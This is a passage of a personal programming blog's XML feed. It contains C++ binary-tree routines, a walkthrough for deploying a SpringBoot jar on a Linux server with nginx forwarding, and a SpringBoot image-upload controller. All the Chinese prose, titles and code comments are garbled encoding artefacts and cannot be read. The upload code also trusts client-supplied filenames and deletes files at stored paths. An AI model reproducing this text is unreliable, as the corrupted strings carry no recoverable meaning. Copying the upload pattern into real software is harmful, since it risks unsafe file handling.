class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> T <span class="token operator">==</span> p<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// å…ˆåœ¨å·¦å­æ ‘æ‰¾</span><span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token function">CalDistance</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å¦‚æœæœªæ‰¾åˆ°,åœ¨å³å­æ ‘ä¸­æ‰¾</span><span class="token keyword">if</span><span class="token punctuation">(</span> res <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token function">CalDistance</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ‰¾åˆ°, è·ç¦»+1 </span><span class="token keyword">if</span><span class="token punctuation">(</span> res <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">return</span> res <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// å¦‚æœå¸¦æƒå€¼, è¿™é‡Œæ”¹æˆ+æƒå€¼</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * [æ±‚æ ‘ä¸­A-Bçš„è·ç¦»] * @param  T [description] * @param  A [description] * @param  B [description] * @return   [description] */</span><span class="token keyword">int</span> <span class="token function">Dis_A_B</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span>BiTree A<span class="token punctuation">,</span>BiTree B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//æ‰¾åˆ°æœ€ä½å…¬å…±ç¥–å…ˆç»“ç‚¹</span>BiTree lowanc <span class="token operator">=</span> <span class="token function">lowAnc</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ±‚æœ€è¿‘æœ€è¿‘å…¬å…±ç¥–å…ˆç»“ç‚¹åˆ°ä¸¤ç›®æ ‡ç»“ç‚¹çš„è·ç¦»ä¹‹å’Œ</span><span class="token keyword">return</span>  <span class="token function">CalDistance</span><span class="token punctuation">(</span>lowanc<span class="token punctuation">,</span>A<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">CalDistance</span><span class="token punctuation">(</span>lowanc<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="20-æ‰¾å‡ºäºŒå‰æ ‘ä¸­æŸä¸ªç»“ç‚¹çš„æ‰€æœ‰ç¥–å…ˆç»“ç‚¹">20++) æ‰¾å‡ºäºŒå‰æ ‘ä¸­æŸä¸ªç»“ç‚¹çš„æ‰€æœ‰ç¥–å…ˆç»“ç‚¹</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826211751339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826211751339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * æ‰¾å‡ºäºŒå‰æ ‘ä¸­æŸä¸ªç»“ç‚¹çš„æ‰€æœ‰ç¥–å…ˆç»“ç‚¹ * @param  T [description] * @param  A [description] * @return   [description] */</span><span class="token keyword">int</span> <span class="token function">FindAllAnc</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span> BiTree A<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// æœªæ‰¾åˆ°</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>T <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//  æ‰¾åˆ°ç›®æ ‡ç»“ç‚¹</span><span class="token keyword">if</span><span class="token punctuation">(</span>ã€€T <span class="token operator">==</span> A<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// å¦‚æœåœ¨å·¦å­æ ‘æˆ–å³å­æ ‘ä¸­æ‰¾åˆ°è¾“å‡ºæ­¤ç¥–å…ˆç»“ç‚¹</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">FindAllAnc</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">,</span>A<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">FindAllAnc</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">,</span>A<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// æˆ–è€…å…¶ä»–æ“ä½œ</span>cout<span class="token operator">&lt;&lt;</span>T<span class="token operator">-></span>data<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç®—æ³• </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBooté¡¹ç›®æ‰“åŒ…å¹¶å‘å¸ƒåˆ°linuxçº¿ä¸Šè¯¦ç»†è®°å½•å…¨è¿‡ç¨‹,è¯¦ç»†!</title>
      <link href="/posts/48019f05/"/>
      <url>/posts/48019f05/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E7%9B%AE%E5%BD%95">TOC</a></p><h1>å‰æœŸå‡†å¤‡</h1><ol><li>ä¸€å°çº¿ä¸ŠlinuxæœåŠ¡å™¨.é˜¿é‡Œäº‘,è…¾è®¯äº‘,åä¸ºäº‘æˆ–è€…å›½å¤–çš„vpséƒ½å¯ä»¥</li><li>sshå·¥å…·,åƒxshell,putty</li><li>sftpä¼ è¾“å·¥å…·,åƒfilezilla. ä¼ è¾“jaråŒ…æ–‡ä»¶</li><li>java jdk linux å®‰è£…åŒ…, å®˜ç½‘å³å¯ä¸‹è½½</li></ol><h1>ä½¿ç”¨Mavenæ‰“åŒ…é¡¹ç›®</h1><h2 id="å¤„ç†é™æ€æ–‡ä»¶ä»¥åŠç«¯å£å·">å¤„ç†é™æ€æ–‡ä»¶ä»¥åŠç«¯å£å·</h2><div class="story post-story"><blockquote><p>å¦‚æœå¼•å…¥äº†å¤–éƒ¨æ–‡ä»¶,åƒuploadä¸Šä¼ å›¾ç‰‡çš„åŠŸèƒ½, éœ€è¦è®¾ç½®ç›®å½•ä¸ºlinuxç›®å½•<br>ä¸€èˆ¬åœ¨windowsä¸Šå¼€å‘,windowså’Œlinuxä¸ä¸€æ ·</p></blockquote><h3 id="application-ymlé…ç½®">application.ymlé…ç½®</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092536.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092536.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092531985"></p><h3 id="MVCconfig">MVCconfig</h3><blockquote><p>å†™ä¸ªjava iimplements  WebMvcConfigurer</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092523.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092523.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092520181"></p></blockquote><pre class="language-java" data-language="java"><code class="language-java"> <span class="token comment">//    æ¥å…¥è™šæ‹Ÿè·¯å¾„ï¼ˆè§£å†³é‡å¯æœåŠ¡å™¨æ‰æ˜¾ç¤ºå›¾ç‰‡çš„é—®é¢˜ï¼‰</span> <span class="token comment">// æ‹¦æˆªæœ¬åœ°è·¯å¾„</span> <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;web.upload-path&#125;"</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token class-name">String</span> path<span class="token punctuation">;</span> <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// addResourceHandler: ï¼ˆ å­˜å‚¨å›¾ç‰‡çš„è™šæ‹Ÿè·¯å¾„ï¼Œåœ¨ static ç›®å½•ä¸‹çš„ picture æ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜å‚¨ä¸Šä¼ å›¾ç‰‡ï¼‰</span>     <span class="token comment">// addResourceLocations: ï¼ˆ file: + å­˜å‚¨å›¾ç‰‡çš„è·¯å¾„ï¼‰    </span>     registry<span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span><span class="token string">"/images/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token string">"file:"</span><span class="token operator">+</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre></div><h2 id="æ‰“åŒ…">æ‰“åŒ…</h2><div class="story post-story"><p>æ­¥éª¤:</p><blockquote><p>å¿½ç•¥æ‰testæµ‹è¯•,é˜²æ­¢å‘å¸ƒåˆ°çº¿ä¸Šå‡ºç°å„ç§é—®é¢˜</p></blockquote><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092511.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092511.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092505953"></p><blockquote><p>æˆåŠŸåä¼šåœ¨targetç›®å½•ä¸‹ç”Ÿæˆ</p></blockquote><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092457.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092457.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092451400"></p><blockquote><p>ç‰ˆæœ¬å·ä¸pom.xml ä¸­versionæœ‰å…³</p></blockquote><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092442.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092442.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092441767"></p><h1>å®‰è£…JDK</h1><p>å‚è€ƒæ–‡ç« : <a href="https://blog.csdn.net/sizaif/article/details/106106955">linuxå®‰è£…java1.8 jdkå¹¶é…ç½®ç¯å¢ƒå˜é‡</a></p><blockquote><p>åƒé˜¿é‡Œäº‘å’Œè…¾è®¯äº‘éœ€è¦é…ç½®å®‰å…¨ç»„,</p></blockquote><p>å‚è€ƒè¿æ¥:<a href="https://help.aliyun.com/document_detail/25471.html">é˜¿é‡Œäº‘å®‰å…¨ç»„é…ç½®æ–¹æ³•</a></p><h1>å°†jaråŒ…ä¼ è¾“åˆ°linuxæœåŠ¡å™¨ä¸Š</h1><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092407.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092407.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092406021"></p><h1>javaè¿è¡ŒjaråŒ…</h1><blockquote><p>ä¸ºäº†æ–¹ä¾¿,å†™ä¸€ä¸ªstart.shè„šæœ¬ æ–¹ä¾¿æ—¥åæ›´æ–°ç‰ˆæœ¬æ‰§è¡Œ</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">vim</span> start.sh<span class="token function">nohup</span> java -jar emsdemo-0.1.8-SNAPSHOT.jar <span class="token operator">></span>springboot.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span class="token function">chmod</span> +x start.sh</code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092420.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092420.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092418809"></p><blockquote><p>è¿è¡Œ  å¹¶æŸ¥çœ‹è¿è¡Œæ—¥å¿—</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">./start.sh<span class="token function">cat</span> springboot.log </code></pre><p>ç„¶ååœ¨æµè§ˆå™¨è¾“å…¥ä½ çš„<strong>ip:ç«¯å£å·</strong>å°±å¯ä»¥è®¿é—®äº†</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092334.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092334.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092332928"></p><h1>é¢å¤–:ä½¿ç”¨åŸŸåè®¿é—®</h1><blockquote><p>å¦‚æœæˆ‘æƒ³é€šè¿‡åŸŸåç›´æ¥è®¿é—®é¡¹ç›®,ä¸æƒ³ç”¨ip+ ç«¯å£å·çš„æ–¹å¼</p></blockquote><p>==<strong><strong>å›½å†…çš„æœåŠ¡å™¨åŸŸåç»‘å®šéœ€è¦å¤‡æ¡ˆ,å›½å¤–ä¸ç”¨</strong></strong>==</p><blockquote><p>æ€è·¯:<br>==é»˜è®¤åŸŸåç»‘å®š80ç«¯å£,æ‰€ä»¥<strong>ä½¿ç”¨nginx ç«¯å£è½¬å‘åŠŸèƒ½</strong>==</p></blockquote></div><h2 id="å®‰è£…nginx">å®‰è£…nginx</h2><div class="story post-story"><p>å¦‚æœä¸æƒ³æ‰‹åŠ¨å®‰è£…,å®‰è£…å®å¡”,ç”¨å®å¡”å®‰è£…å’Œé…ç½®<br>å®å¡”å®‰è£…:<a href="https://www.bt.cn/bbs/thread-19376-1-1.html">linuxå®‰è£…å®å¡”</a></p><h3 id="é…ç½®nginx">é…ç½®nginx</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092311.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092311.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092308964"></p><pre class="language-conf" data-language="conf"><code class="language-conf">server   &#123;       listen 80;       #server_name phpmyadmin;       #index index.html index.htm index.php;       #root  &#x2F;www&#x2F;server&#x2F;phpmyadmin;       #error_page   404   &#x2F;404.html;       #include enable-php.conf;       location &#x2F; &#123;            proxy_pass http:&#x2F;&#x2F;sizaif.com:8080;       &#125;   &#125;</code></pre><p>ç„¶årelod nginx è¿‡ä¸€ä¼šé€šè¿‡åŸŸåå°±å¯ä»¥è®¿é—®äº†</p></div><h2 id="æ•ˆæœ">æ•ˆæœ</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092610.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092610.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092608387"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Java </category>
          
          <category> Springboot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBooté¡¹ç›®å›¾ç‰‡æ–‡ä»¶çš„ä¸Šä¼ ä¸æ˜¾ç¤º</title>
      <link href="/posts/38a7ff2/"/>
      <url>/posts/38a7ff2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>éœ€æ±‚åˆ†æ</h1><p>åœ¨ä¸ªäººä¿¡æ¯é¡µé¢ç‚¹å‡»å›¾ç‰‡ä¸Šä¼ ,ä¸Šä¼ æ–‡ä»¶åˆ°åå°å,å¹¶ä¿®æ”¹å›¾ç‰‡çš„åç§°,è®¾ç½®ä¸º<br>å”¯ä¸€çš„åç§°,å¹¶åŒæ­¥è·Ÿæ–°å›¾ç‰‡åç§°åˆ°æ•°æ®åº“ä¸­</p><h1>æ•°æ®åº“è®¾è®¡</h1><p>æˆ‘çš„æ•°æ®åº“ä¸­: Userså­˜æ”¾ç”¨æˆ·åå’Œå¯†ç , Member å­˜æ”¾ç”¨æˆ·è¯¦ç»†ä¿¡æ¯(åŒ…æ‹¬å›¾ç‰‡)</p><h1>é…ç½®application.yml</h1><p>è®¾ç½®è‡ªå®šä¹‰çš„æ–‡ä»¶ä¸Šä¼ ç›®å½•:</p><pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token comment"># è‡ªå®šä¹‰æ–‡ä»¶ä¸Šä¼ è·¯å¾„</span><span class="token key atrule">web</span><span class="token punctuation">:</span>  <span class="token comment"># Linux</span>  <span class="token comment"># upload-path: /root/emsdemo/image</span>  <span class="token comment"># Windows 10</span>  <span class="token key atrule">upload-path</span><span class="token punctuation">:</span> C<span class="token punctuation">:</span>/Users/SIZ/Desktop/bishe/image/</code></pre><h1>åå°ä»£ç </h1><h2 id="æ§åˆ¶ä»£ç ">æ§åˆ¶ä»£ç </h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;web.upload-path&#125;"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token class-name">String</span> path<span class="token punctuation">;</span><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/users/doUpload/&#123;uid&#125;"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">UploadImage</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"uid"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> id<span class="token punctuation">,</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"imgfile"</span><span class="token punctuation">)</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">,</span><span class="token class-name">HttpServletRequest</span> httpServletRequest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/**     * header_img_urlæ˜¯ä»æ•°æ®åº“é‡Œæçš„ï¼Œè¦å’Œä½ æœ¬åœ°æˆ–è€…çº¿ä¸Šçš„ä¸“é—¨æ”¾å›¾ç‰‡çš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶å»åŒ¹é…ï¼Œ     * å¦‚æœä¸€å¼€å§‹æˆ‘æäº†æ•°æ®åº“çš„å¤´åƒï¼Œå‘ç°è¿™ä¸ªå·²ç»å­˜åœ¨æ–‡ä»¶å¤¹é‡Œäº†ï¼Œé‚£æˆ‘éœ€è¦æ¢å¤´åƒçš„æ—¶å€™ï¼Œ     * å°±éœ€è¦æ‰¾æ–‡ä»¶å¤¹é‡Œæœ‰æ²¡æœ‰å’Œè¿™ä¸€æ¨¡ä¸€æ ·çš„æ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾æ˜¯æœ‰çš„ï¼Œå› ä¸ºä¸ç®¡æ¢ä¸æ¢å¤´åƒä¹‹å‰ï¼Œ     * æˆ‘è¿™ä¸ªå¤´åƒä¸€å®šæ˜¯ä¿å­˜åœ¨æ•°æ®åº“å­—æ®µé‡Œé¢ï¼Œå¹¶ä¸”ä¹Ÿåœ¨æ–‡ä»¶å¤¹é‡Œé¢ï¼Œæ­¤æ—¶æˆ‘è¦æ›´æ¢å¤´åƒäº†ï¼Œ     * é‚£æˆ‘è‚¯å®šè¦æŠŠæ–‡ä»¶çš„è¿™ä¸ªå¤´åƒæ–‡ä»¶åˆ æ‰å¹¶æŠŠæ–°ä¸Šä¼ çš„å¤´åƒæ–‡ä»¶åŠ è¿›æ¥ï¼Œä¸å­˜å†å²è®°å½•ï¼Œ     * é˜²æ­¢è¶Šæ¥è¶Šå¤šçš„å¤´åƒå å†…å­˜ï¼Œå¹¶ä¸”ï¼Œæˆ‘è¦æŠŠè¿™æ¡è®°å½•æ’åˆ°æ•°æ®åº“é‡Œé¢ï¼Œï¼Œç›¸å½“äºæ›´æ–°äº†å¤´åƒã€‚     */</span>    <span class="token comment">// è·å–å½“å‰ç”¨æˆ·</span>    <span class="token class-name">Subject</span> currentUser <span class="token operator">=</span> <span class="token class-name">SecurityUtils</span><span class="token punctuation">.</span><span class="token function">getSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Users</span> curru <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Users</span><span class="token punctuation">)</span> currentUser<span class="token punctuation">.</span><span class="token function">getPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"currenttUser.ID--> "</span> <span class="token operator">+</span> curru<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * æ ¹æ®User.id  æ‹¿åˆ°member å…¨éƒ¨ä¿¡æ¯     */</span>    <span class="token class-name">Member</span> member <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">memberService<span class="token punctuation">.</span></span>QueryOneMemberInfoByID</span><span class="token punctuation">(</span>curru<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     *  è·å–æ•°æ®åº“ä¸­å½“å‰ç”¨æˆ·çš„ç…§ç‰‡     *  è‹¥å­˜åœ¨åˆ™åˆ é™¤,æ›¿æ¢     */</span>    <span class="token class-name">File</span> sqlfile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>member<span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Boolean</span> isExits <span class="token operator">=</span> sqlfile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>isExits<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        sqlfile<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//å¾—åˆ°å°†è¦ä¸Šä¼ çš„æ–‡ä»¶å</span>    <span class="token class-name">String</span> fileName <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//è®¾ç½®æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”è®¾ç½®äº†æ–°çš„å”¯ä¸€åå­—XXXXX.jpg</span>    <span class="token class-name">String</span> newFileName <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">upload</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> path<span class="token punctuation">,</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     *  è¿æ¥æ•°æ®åº“è¿›è¡Œè¿›è¡Œæ›´æ–°     */</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> memberMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    memberMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"image"</span><span class="token punctuation">,</span>newFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>    memberMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">SystemResult</span> systemResult <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">memberService<span class="token punctuation">.</span></span>UpdateMemberInfo</span><span class="token punctuation">(</span>memberMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>systemResult<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// å¤±è´¥</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>systemResult<span class="token punctuation">.</span><span class="token function">getMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// æˆåŠŸ</span>        <span class="token comment">/**         *  æ›´æ–°åˆ°IndexDto ä¸­         */</span>        <span class="token class-name">Member</span> afterUpdateImageMember <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">memberService<span class="token punctuation">.</span></span>QueryOneMemberInfoByID</span><span class="token punctuation">(</span>curru<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">IndexDto</span> indexDto <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IndexDto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UsersServiceAppoint<span class="token punctuation">.</span>WriteUsersInfoToDto</span><span class="token punctuation">(</span>indexDto<span class="token punctuation">,</span>curru<span class="token punctuation">,</span>afterUpdateImageMember<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Session</span> session <span class="token operator">=</span>  currentUser<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HttpSession</span> httpSession <span class="token operator">=</span> httpServletRequest<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        httpSession<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"IndexDto"</span><span class="token punctuation">,</span>indexDto<span class="token punctuation">)</span><span class="token punctuation">;</span>        session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"IndexDto"</span><span class="token punctuation">,</span>indexDto<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¿›è¡Œäº†å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½,å¹¶æ›´æ–°åˆ°æ•°æ®åº“"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>systemResult<span class="token punctuation">.</span><span class="token function">getMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     *  é‡å®šå‘åˆ°--->ä¸ªäººä¿¡æ¯é¡µé¢     */</span>    <span class="token keyword">return</span> <span class="token string">"redirect:/users/toProfilesPage/"</span><span class="token operator">+</span> 